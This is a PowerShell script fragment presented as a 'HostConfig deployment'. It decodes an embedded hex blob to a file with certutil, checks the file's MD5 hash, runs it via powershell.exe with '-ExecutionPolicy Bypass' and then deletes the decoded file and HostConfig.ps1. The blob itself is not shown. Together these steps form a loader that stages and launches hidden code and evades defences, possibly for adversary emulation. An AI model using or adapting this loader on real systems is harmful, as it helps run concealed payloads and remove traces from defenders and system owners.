function New-HexBlobToFile {
    param(
        [string]$HexBlob,
        [string]$FileName
    )

    Write-Host "[*] Decoding hex blob to file: $FileName" -ForegroundColor Yellow

    $HexFile = "$env:TEMP\file.hex"

    $HexBlob | Out-File -FilePath $HexFile -Encoding ascii

    certutil -f -decodeHex $HexFile $FileName > $null 2>&1

    Remove-Item $HexFile -Force -ErrorAction SilentlyContinue

    if (!(Test-Path $FileName)) {
        throw "Failed to decode hex blob to $FileName"
    }
}


function Confirm-MD5Hash {
    param(
        [string]$FileName,
        [string]$ExpectedHash
    )

    Write-Host "[*] Verifying MD5 hash for $FileName" -ForegroundColor Yellow

    $md5 = (Get-FileHash -Path $FileName -Algorithm MD5 | Select-Object -ExpandProperty Hash).ToLower()
    $expected = $ExpectedHash.ToLower()

    if ($md5 -eq $expected) {
        Write-Host "[+] Hash confirmed." -ForegroundColor Green
        return $true
    } else {
        Write-Host "[-] Hash mismatch. Manually check." -ForegroundColor Red
        return $false
    }
}


Write-Host "[*] Starting HostConfig deployment..." -ForegroundColor Cyan

if (!(Test-Path $BasePath)) {
    New-Item -Path $BasePath -ItemType Directory -Force | Out-Null
}

New-HexBlobToFile -HexBlob $bin1 -FileName $OutputFile

if (!(Confirm-MD5Hash -FileName $OutputFile -ExpectedHash "0dfef15e6f27de3e5744dce83f4cca41")) {
    throw "Hash validation failed. Aborting."
}

Write-Host "[*] Executing config..." -ForegroundColor Yellow
Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File `"$OutputFile`"" -Wait

# Cleanup
Write-Host "[*] Cleaning up artifacts..." -ForegroundColor Yellow

Start-Sleep 2

Remove-Item $OutputFile -Force -ErrorAction SilentlyContinue
Remove-Item "$BasePath\HostConfig.ps1" -Force -ErrorAction SilentlyContinue

Write-Host "[+] HostConfig completed." -ForegroundColor Green